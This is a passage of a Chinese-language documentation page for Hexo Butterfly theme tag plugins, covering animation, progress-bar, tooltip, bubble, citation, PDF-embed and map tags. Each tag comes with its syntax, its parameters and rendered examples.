aria-hidden="true"><use xlink:href="#icon-boar_hai"></use></svg><svg class="icon" style="width:6em; height:6em" aria-hidden="true"><use xlink:href="#icon-boar"></use></svg></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-24-特效标签-wow">2.24 特效标签 wow</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-2">渲染演示</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% wow [animete],[duration],[delay],[offset],[iteration] %&#125;</span><br><span class="line">内容</span><br><span class="line">&#123;% endwow %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li><code>animate</code>: 动画样式，效果详见<a href="https://animate.style/">animate.css 参考文档</a></li><li><code>duration</code>: 选填项，动画持续时间，单位可以是<code>ms</code>也可以是<code>s</code>。例如<code>3s</code>，<code>700ms</code>。</li><li><code>delay</code>: 选填项，动画开始的延迟时间，单位可以是<code>ms</code>也可以是<code>s</code>。例如<code>3s</code>，<code>700ms</code>。</li><li><code>offset</code>: 选填项，开始动画的距离（相对浏览器底部）</li><li><code>iteration</code>: 选填项，动画重复的次数</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><p>1.flip 动画效果。</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;% wow animate<span class="strong">__zoomIn,5s,5s,100,10 %&#125;</span></span><br><span class="line"><span class="strong">&#123;% note blue &#x27;fas fa-bullhorn&#x27; modern%&#125;</span></span><br><span class="line"><span class="strong">`zoomIn`动画效果，持续`5s`，延时`5s`，离底部`100`距离时启动，重复`10`次</span></span><br><span class="line"><span class="strong">&#123;% endnote %&#125;</span></span><br><span class="line"><span class="strong">&#123;% endwow %&#125;</span></span><br></pre></td></tr></table></figure><p>2.zoomIn 动画效果，持续 5s，延时 5s，离底部 100 距离时启动，重复 10 次</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;% wow animate<span class="strong">__zoomIn,5s,5s,100,10 %&#125;</span></span><br><span class="line"><span class="strong">&#123;% note blue &#x27;fas fa-bullhorn&#x27; modern%&#125;</span></span><br><span class="line"><span class="strong">`zoomIn`动画效果，持续`5s`，延时`5s`，离底部`100`距离时启动，重复`10`次</span></span><br><span class="line"><span class="strong">&#123;% endnote %&#125;</span></span><br><span class="line"><span class="strong">&#123;% endwow %&#125;</span></span><br></pre></td></tr></table></figure><p>3.slideInRight 动画效果，持续 5s，延时 5s</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;% wow animate<span class="strong">__slideInRight,5s,5s %&#125;</span></span><br><span class="line"><span class="strong">&#123;% note orange &#x27;fas fa-car&#x27; modern%&#125;</span></span><br><span class="line"><span class="strong">`slideInRight`动画效果，持续`5s`，延时`5s`。</span></span><br><span class="line"><span class="strong">&#123;% endnote %&#125;</span></span><br><span class="line"><span class="strong">&#123;% endwow %&#125;</span></span><br></pre></td></tr></table></figure><p>4.heartBeat 动画效果，延时 5s，重复 10 次。此处注意不用的参数位置要留空，用逗号间隔。</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;% wow animate<span class="strong">__heartBeat,,5s,,10 %&#125;</span></span><br><span class="line"><span class="strong">&#123;% note red &#x27;fas fa-battery-half&#x27; modern%&#125;</span></span><br><span class="line"><span class="strong">`heartBeat`动画效果，延时`5s`，重复`10`次。</span></span><br><span class="line"><span class="strong">&#123;% endnote %&#125;</span></span><br><span class="line"><span class="strong">&#123;% endwow %&#125;</span></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><p>1.flip 动画效果。</p><div class='wow animate__zoomIn' data-wow-duration='5s' data-wow-delay='5s' data-wow-offset='100'  data-wow-iteration='10' ><div class="note blue icon-padding modern"><i class="note-icon fas fa-bullhorn"></i><p><code>zoomIn</code>动画效果，持续<code>5s</code>，延时<code>5s</code>，离底部<code>100</code>距离时启动，重复<code>10</code>次</p></div></div><p>2.zoomIn 动画效果，持续 5s，延时 5s，离底部 100 距离时启动，重复 10 次</p><div class='wow animate__zoomIn' data-wow-duration='5s' data-wow-delay='5s' data-wow-offset='100'  data-wow-iteration='10' ><div class="note blue icon-padding modern"><i class="note-icon fas fa-bullhorn"></i><p><code>zoomIn</code>动画效果，持续<code>5s</code>，延时<code>5s</code>，离底部<code>100</code>距离时启动，重复<code>10</code>次</p></div></div><p>3.slideInRight 动画效果，持续 5s，延时 5s</p><div class='wow animate__slideInRight' data-wow-duration='5s' data-wow-delay='5s' data-wow-offset=''  data-wow-iteration='' ><div class="note orange icon-padding modern"><i class="note-icon fas fa-car"></i><p><code>slideInRight</code>动画效果，持续<code>5s</code>，延时<code>5s</code>。</p></div></div><p>4.heartBeat 动画效果，延时 5s，重复 10 次。此处注意不用的参数位置要留空，用逗号间隔。</p><div class='wow animate__heartBeat' data-wow-duration='' data-wow-delay='5s' data-wow-offset=''  data-wow-iteration='10' ><div class="note red icon-padding modern"><i class="note-icon fas fa-battery-half"></i><p><code>heartBeat</code>动画效果，延时<code>5s</code>，重复<code>10</code>次。</p></div></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-25-进度条-progress">2.25 进度条 progress</h2><div class="note info flat"><p>进度条标签参考<a href="https://rongbuqiu.com/jdt.html">沂佰孜猫-给 HEXO 文章添加彩色进度条</a>。<br>源样式提取自<a href="https://zwying0814.gitbook.io/cuteen/">Cuteen</a>主题。</p></div><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">参数配置</button></li><li class="tab"><button type="button" data-href="#分栏-2">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% progress [width] [color] [text] %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li><code>width</code>: 0 到 100 的阿拉伯数字</li><li><code>color</code>: 颜色，取值有 red,yellow,green,cyan,blue,gray</li><li><code>text</code>:进度条上的文字内容</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;% progress 10 red 进度条样式预览 %&#125;</span><br><span class="line">&#123;% progress 30 yellow 进度条样式预览 %&#125;</span><br><span class="line">&#123;% progress 50 green 进度条样式预览 %&#125;</span><br><span class="line">&#123;% progress 70 cyan 进度条样式预览 %&#125;</span><br><span class="line">&#123;% progress 90 blue 进度条样式预览 %&#125;</span><br><span class="line">&#123;% progress 100 gray 进度条样式预览 %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><div class="progress"><div class="progress-bar-animated progress-bar progress-bar-striped bg-red"  style="width: 10%" aria-valuenow="10" aria-valuemin="0" aria-valuemax="100"><p>进度条样式预览</p></div></div><div class="progress"><div class="progress-bar-animated progress-bar progress-bar-striped bg-yellow"  style="width: 30%" aria-valuenow="30" aria-valuemin="0" aria-valuemax="100"><p>进度条样式预览</p></div></div><div class="progress"><div class="progress-bar-animated progress-bar progress-bar-striped bg-green"  style="width: 50%" aria-valuenow="50" aria-valuemin="0" aria-valuemax="100"><p>进度条样式预览</p></div></div><div class="progress"><div class="progress-bar-animated progress-bar progress-bar-striped bg-cyan"  style="width: 70%" aria-valuenow="70" aria-valuemin="0" aria-valuemax="100"><p>进度条样式预览</p></div></div><div class="progress"><div class="progress-bar-animated progress-bar progress-bar-striped bg-blue"  style="width: 90%" aria-valuenow="90" aria-valuemin="0" aria-valuemax="100"><p>进度条样式预览</p></div></div><div class="progress"><div class="progress-bar-animated progress-bar progress-bar-striped bg-gray"  style="width: 100%" aria-valuenow="100" aria-valuemin="0" aria-valuemax="100"><p>进度条样式预览</p></div></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-26-注释-notation">2.26 注释 notation</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">参数配置</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% nota [label] , [text] %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li><p><code>label</code>: 注释词汇</p></li><li><p><code>text</code>: 悬停显示的注解内容</p></li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% nota 把鼠标移动到我上面试试 ,可以看到注解内容出现在顶栏 %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><p><span class='nota' data-nota='可以看到注解内容出现在顶栏'>把鼠标移动到我上面试试</span></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-27-气泡注释-bubble">2.27 气泡注释 bubble</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">参数配置</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% bubble [content] , [notation] ,[background-color] %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li><code>content</code>: 注释词汇</li><li><code>notation</code>: 悬停显示的注解内容</li><li><code>background-color</code>: 可选，气泡背景色。默认为“#71a4e3”</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">最近我学到了不少新玩意儿（虽然对很多大佬来说这些已经是旧技术了），比如CSS的&#123;% bubble 兄弟相邻选择器,&quot;例如 h1 + p &#123;margin-top:50px;&#125;&quot; %&#125;，&#123;% bubble flex布局,&quot;Flex 是 Flexible Box 的缩写，意为&quot;弹性布局&quot;，用来为盒状模型提供最大的灵活性&quot;,&quot;#ec5830&quot; %&#125;，&#123;% bubble transform变换,&quot;transform 属性向元素应用 2D 或 3D 转换。该属性允许我们对元素进行旋转、缩放、移动或倾斜。&quot;,&quot;#1db675&quot; %&#125;，animation的&#123;% bubble 贝塞尔速度曲线,&quot;贝塞尔曲线(Bézier curve)，又称贝兹曲线或贝济埃曲线，是应用于二维图形应用程序的数学曲线。一般的矢量图形软件通过它来精确画出曲线，贝兹曲线由线段与节点组成，节点是可拖动的支点，线段像可伸缩的皮筋&quot;,&quot;#de4489&quot; %&#125;写法，还有今天刚看到的&#123;% bubble clip-path,&quot;clip-path属性使用裁剪方式创建元素的可显示区域。区域内的部分显示，区域外的隐藏。&quot;,&quot;#868fd7&quot; %&#125;属性。这些对我来说很新颖的概念狠狠的冲击着我以前积累起来的设计思路。</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><p>最近我学到了不少新玩意儿（虽然对很多大佬来说这些已经是旧技术了），比如 CSS 的<span class="bubble-content">兄弟相邻选择器</span><span class="bubble-notation"><span class="bubble-item" style="background-color:#71a4e3;">例如 h1 + p {margin-top:50px;}</span></span>，<span class="bubble-content">flex布局</span><span class="bubble-notation"><span class="bubble-item" style="background-color:#ec5830;">Flex 是 Flexible Box 的缩写，意为弹性布局&quot;，用来为盒状模型提供最大的灵活性&quot;</span></span>，<span class="bubble-content">transform变换</span><span class="bubble-notation"><span class="bubble-item" style="background-color:#1db675;">transform 属性向元素应用 2D 或 3D 转换。该属性允许我们对元素进行旋转、缩放、移动或倾斜。</span></span>，animation 的<span class="bubble-content">贝塞尔速度曲线</span><span class="bubble-notation"><span class="bubble-item" style="background-color:#de4489;">贝塞尔曲线(Bézier curve)，又称贝兹曲线或贝济埃曲线，是应用于二维图形应用程序的数学曲线。一般的矢量图形软件通过它来精确画出曲线，贝兹曲线由线段与节点组成，节点是可拖动的支点，线段像可伸缩的皮筋</span></span>写法，还有今天刚看到的<span class="bubble-content">clip-path</span><span class="bubble-notation"><span class="bubble-item" style="background-color:#868fd7;">clip-path属性使用裁剪方式创建元素的可显示区域。区域内的部分显示，区域外的隐藏。</span></span>属性。这些对我来说很新颖的概念狠狠的冲击着我以前积累起来的设计思路。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-28-引用文献-reference">2.28 引用文献 reference</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">参数配置</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% referto [id] , [literature] %&#125;</span><br><span class="line">&#123;% referfrom [id] , [literature] , [url] %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li><p>referto 引用上标</p><ul><li><p><code>id</code>: 上标序号内容，需与 referfrom 标签的 id 对应才能实现跳转</p></li><li><p><code>literature</code>: 引用的参考文献名称</p></li></ul></li><li><p>referfrom 引用出处</p><ul><li><p><code>id</code>: 序号内容，需与 referto 标签的 id 对应才能实现 跳转</p></li><li><p><code>literature</code>: 引用的参考文献名称</p></li><li><p><code>url</code>: 引用的参考文献链接，可省略</p></li></ul></li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Akilarの糖果屋(akilar.top)是一个私人性质的博客&#123;% referto &#x27;[1]&#x27;,&#x27;Akilarの糖果屋群聊简介&#x27; %&#125;，从各类教程至生活点滴，无话不谈。建群的目的是提供一个闲聊的场所。博客采用Hexo框架&#123;% referto &#x27;[2]&#x27;,&#x27;Hexo中文文档&#x27; %&#125;，Butterfly主题&#123;% referto &#x27;[3]&#x27;,&#x27;Butterfly 安装文档(一) 快速开始&#x27; %&#125;</span><br><span class="line"></span><br><span class="line">本项目参考了Volantis&#123;% referto &#x27;[4]&#x27;,&#x27;hexo-theme-volantis 标签插件&#x27; %&#125;的标签样式。引入<span class="code">`[tag].js`</span>，并针对<span class="code">`butterfly`</span>主题修改了相应的<span class="code">`[tag].styl`</span>。在此鸣谢<span class="code">`Volantis`</span>主题众开发者。</span><br><span class="line">主要参考内容包括各个volantis的内置标签插件文档&#123;% referto &#x27;[5]&#x27;,&#x27;Volantis文档:内置标签插件&#x27; %&#125;</span><br><span class="line">Butterfly主题的各个衍生魔改&#123;% referto &#x27;[6]&#x27;,&#x27;Butterfly 安装文档:标签外挂（Tag Plugins&#x27; %&#125;&#123;% referto &#x27;[7]&#x27;,&#x27;小弋の生活馆全样式预览&#x27; %&#125;&#123;% referto &#x27;[8]&#x27;,&#x27;l-lin-font-awesome-animation&#x27; %&#125;&#123;% referto &#x27;[9]&#x27;,&#x27;小康的butterfly主题使用文档&#x27; %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% referfrom &#x27;[1]&#x27;,&#x27;Akilarの糖果屋群聊简介&#x27;,&#x27;https://jq.qq.com/?<span class="emphasis">_wv=1027&amp;k=pGLB2C0N&#x27; %&#125;</span></span><br><span class="line"><span class="emphasis">&#123;% referfrom &#x27;[2]&#x27;,&#x27;Hexo中文文档&#x27;,&#x27;https://hexo.io/zh-cn/docs/&#x27; %&#125;</span></span><br><span class="line"><span class="emphasis">&#123;% referfrom &#x27;[3]&#x27;,&#x27;Butterfly 安装文档(一) 快速开始&#x27;,&#x27;https://butterfly.js.org/posts/21cfbf15/&#x27; %&#125;</span></span><br><span class="line"><span class="emphasis">&#123;% referfrom &#x27;[4]&#x27;,&#x27;hexo-theme-volantis 标签插件&#x27;,&#x27;https://volantis.js.org/v5/tag-plugins/&#x27; %&#125;</span></span><br><span class="line"><span class="emphasis">&#123;% referfrom &#x27;[5]&#x27;,&#x27;Volantis文档:内置标签插件&#x27;,&#x27;https://volantis.js.org/tag-plugins/&#x27; %&#125;</span></span><br><span class="line"><span class="emphasis">&#123;% referfrom &#x27;[6]&#x27;,&#x27;Butterfly 安装文档:标签外挂（Tag Plugins&#x27;,&#x27;https://butterfly.js.org/posts/4aa8abbe/#%E6%A8%99%E7%B1%A4%E5%A4%96%E6%8E%9B%EF%BC%88Tag-Plugins%EF%BC%89&#x27; %&#125;</span></span><br><span class="line"><span class="emphasis">&#123;% referfrom &#x27;[7]&#x27;,&#x27;小弋の生活馆全样式预览&#x27;,&#x27;https://lovelijunyi.gitee.io/posts/c898.html&#x27; %&#125;</span></span><br><span class="line"><span class="emphasis">&#123;% referfrom &#x27;[8]&#x27;,&#x27;l-lin-font-awesome-animation&#x27;,&#x27;https://github.com/l-lin/font-awesome-animation&#x27; %&#125;</span></span><br><span class="line"><span class="emphasis">&#123;% referfrom &#x27;[9]&#x27;,&#x27;小康的butterfly主题使用文档&#x27;,&#x27;https://www.antmoe.com/posts/3b43914f/&#x27; %&#125;</span></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><p>Akilar の糖果屋(akilar.top)是一个私人性质的博客<span class="hidden-anchor" id="referto_[1]"></span><sup class="reference"><a href="#referfrom_[1]">[1]</a></sup><span class="reference-bubble"><span class="reference-item"><span class="reference-literature">Akilarの糖果屋群聊简介</span><span class="reference-title">参考资料</span></span></span>，从各类教程至生活点滴，无话不谈。建群的目的是提供一个闲聊的场所。博客采用 Hexo 框架<span class="hidden-anchor" id="referto_[2]"></span><sup class="reference"><a href="#referfrom_[2]">[2]</a></sup><span class="reference-bubble"><span class="reference-item"><span class="reference-literature">Hexo中文文档</span><span class="reference-title">参考资料</span></span></span>，Butterfly 主题<span class="hidden-anchor" id="referto_[3]"></span><sup class="reference"><a href="#referfrom_[3]">[3]</a></sup><span class="reference-bubble"><span class="reference-item"><span class="reference-literature">Butterfly 安装文档(一) 快速开始</span><span class="reference-title">参考资料</span></span></span></p><p>本项目参考了 Volantis<span class="hidden-anchor" id="referto_[4]"></span><sup class="reference"><a href="#referfrom_[4]">[4]</a></sup><span class="reference-bubble"><span class="reference-item"><span class="reference-literature">hexo-theme-volantis 标签插件</span><span class="reference-title">参考资料</span></span></span>的标签样式。引入<code>[tag].js</code>，并针对<code>butterfly</code>主题修改了相应的<code>[tag].styl</code>。在此鸣谢<code>Volantis</code>主题众开发者。<br>主要参考内容包括各个 volantis 的内置标签插件文档<span class="hidden-anchor" id="referto_[5]"></span><sup class="reference"><a href="#referfrom_[5]">[5]</a></sup><span class="reference-bubble"><span class="reference-item"><span class="reference-literature">Volantis文档:内置标签插件</span><span class="reference-title">参考资料</span></span></span><br>Butterfly 主题的各个衍生魔改<span class="hidden-anchor" id="referto_[6]"></span><sup class="reference"><a href="#referfrom_[6]">[6]</a></sup><span class="reference-bubble"><span class="reference-item"><span class="reference-literature">Butterfly 安装文档:标签外挂（Tag Plugins</span><span class="reference-title">参考资料</span></span></span><span class="hidden-anchor" id="referto_[7]"></span><sup class="reference"><a href="#referfrom_[7]">[7]</a></sup><span class="reference-bubble"><span class="reference-item"><span class="reference-literature">小弋の生活馆全样式预览</span><span class="reference-title">参考资料</span></span></span><span class="hidden-anchor" id="referto_[8]"></span><sup class="reference"><a href="#referfrom_[8]">[8]</a></sup><span class="reference-bubble"><span class="reference-item"><span class="reference-literature">l-lin-font-awesome-animation</span><span class="reference-title">参考资料</span></span></span><span class="hidden-anchor" id="referto_[9]"></span><sup class="reference"><a href="#referfrom_[9]">[9]</a></sup><span class="reference-bubble"><span class="reference-item"><span class="reference-literature">小康的butterfly主题使用文档</span><span class="reference-title">参考资料</span></span></span></p><div class="reference-source"><span class="hidden-anchor" id="referfrom_[1]"></span><a class="reference-anchor" href="#referto_[1]">[1]<div class="reference-anchor-up fa-solid fa-angles-up"></div></a><a class="reference-link" href="https://jq.qq.com/?_wv=1027&k=pGLB2C0N">Akilarの糖果屋群聊简介</a></div><div class="reference-source"><span class="hidden-anchor" id="referfrom_[2]"></span><a class="reference-anchor" href="#referto_[2]">[2]<div class="reference-anchor-up fa-solid fa-angles-up"></div></a><a class="reference-link" href="https://hexo.io/zh-cn/docs/">Hexo中文文档</a></div><div class="reference-source"><span class="hidden-anchor" id="referfrom_[3]"></span><a class="reference-anchor" href="#referto_[3]">[3]<div class="reference-anchor-up fa-solid fa-angles-up"></div></a><a class="reference-link" href="https://butterfly.js.org/posts/21cfbf15/">Butterfly 安装文档(一) 快速开始</a></div><div class="reference-source"><span class="hidden-anchor" id="referfrom_[4]"></span><a class="reference-anchor" href="#referto_[4]">[4]<div class="reference-anchor-up fa-solid fa-angles-up"></div></a><a class="reference-link" href="https://volantis.js.org/v5/tag-plugins/">hexo-theme-volantis 标签插件</a></div><div class="reference-source"><span class="hidden-anchor" id="referfrom_[5]"></span><a class="reference-anchor" href="#referto_[5]">[5]<div class="reference-anchor-up fa-solid fa-angles-up"></div></a><a class="reference-link" href="https://volantis.js.org/tag-plugins/">Volantis文档:内置标签插件</a></div><div class="reference-source"><span class="hidden-anchor" id="referfrom_[6]"></span><a class="reference-anchor" href="#referto_[6]">[6]<div class="reference-anchor-up fa-solid fa-angles-up"></div></a><a class="reference-link" href="https://butterfly.js.org/posts/4aa8abbe/#%E6%A8%99%E7%B1%A4%E5%A4%96%E6%8E%9B%EF%BC%88Tag-Plugins%EF%BC%89">Butterfly 安装文档:标签外挂（Tag Plugins</a></div><div class="reference-source"><span class="hidden-anchor" id="referfrom_[7]"></span><a class="reference-anchor" href="#referto_[7]">[7]<div class="reference-anchor-up fa-solid fa-angles-up"></div></a><a class="reference-link" href="https://lovelijunyi.gitee.io/posts/c898.html">小弋の生活馆全样式预览</a></div><div class="reference-source"><span class="hidden-anchor" id="referfrom_[8]"></span><a class="reference-anchor" href="#referto_[8]">[8]<div class="reference-anchor-up fa-solid fa-angles-up"></div></a><a class="reference-link" href="https://github.com/l-lin/font-awesome-animation">l-lin-font-awesome-animation</a></div><div class="reference-source"><span class="hidden-anchor" id="referfrom_[9]"></span><a class="reference-anchor" href="#referto_[9]">[9]<div class="reference-anchor-up fa-solid fa-angles-up"></div></a><a class="reference-link" href="https://www.antmoe.com/posts/3b43914f/">小康的butterfly主题使用文档</a></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-29-PDF-展示">2.29 PDF 展示</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">参数配置</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% pdf 文件路径 %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li><code>文件路径</code>: 可以是相对路径或者是在线链接</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># 1.本地文件:在md文件路径下创建一个同名文件夹，其内放pdf文件名为xxx.pdf的文件</span></span><br><span class="line">&#123;% pdf xxx.pdf %&#125;</span><br><span class="line"><span class="section"># 2.在线链接</span></span><br><span class="line">&#123;% pdf https://cdn.jsdelivr.net/gh/Justlovesmile/CDN/pdf/小作文讲义.pdf %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><p>2.在线链接(要放到最外层才能起作用)</p><pre><code>&lt;div class=&quot;row&quot;&gt;&lt;embed src=&quot;https://cdn.jsdelivr.net/gh/Justlovesmile/CDN/pdf/小作文讲义.pdf&quot; width=&quot;100%&quot; height=&quot;550&quot; type=&quot;application/pdf&quot;&gt;&lt;/div&gt;</code></pre><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-30-Hexo-tag-map-插件">2.30 Hexo-tag-map 插件</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">参数配置</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% + 标签值 + 经度 + 纬度 + 文本 + 缩放等级 + 宽 + 高 + 默认图层 + %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><table><thead><tr><th style="text-align:center">地图名</th><th style="text-align:center">标签值 &lt;必填&gt;</th><th style="text-align:center">宽 (默认 100%) / 高 (默认 360px)</th><th style="text-align:center">缩放等级 (默认 14)</th><th style="text-align:center">宽 (默认 100%) / 高 (默认 360px)</th><th style="text-align:center">默认图层 (默认 1)</th></tr></thead><tbody><tr><td style="text-align:center">混合地图</td><td style="text-align:center">map</td><td style="text-align:center">百分数或具体值 (100% 或 360px)</td><td style="text-align:center">取值 3~18</td><td style="text-align:center">百分数或具体值 (100% 或 360px)</td><td style="text-align:center">取值 1~7</td></tr><tr><td style="text-align:center">谷歌地图</td><td style="text-align:center">googleMap</td><td style="text-align:center">百分数或具体值 (100% 或 360px)</td><td style="text-align:center">取值 1~20</td><td 